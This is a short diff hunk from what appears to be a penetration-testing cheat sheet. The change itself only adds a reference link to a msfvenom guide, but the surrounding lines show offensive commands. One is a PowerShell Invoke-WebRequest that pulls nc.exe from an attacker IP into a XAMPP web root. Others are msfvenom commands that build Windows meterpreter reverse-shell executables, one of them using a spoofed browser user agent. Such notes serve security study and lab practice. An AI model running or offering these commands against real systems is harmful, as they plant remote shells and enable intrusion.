@@ -46,7 +46,7 @@ Upload pages, certutil, powershell
     powershell Invoke-WebRequest -Uri http://192.168.119.149:8888/nc.exe -OutFile C:\xampp\htdocs\nc.exe  
     
 ### Msfvenom 
-
+[Reference](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/) 
 
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	
     msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe	
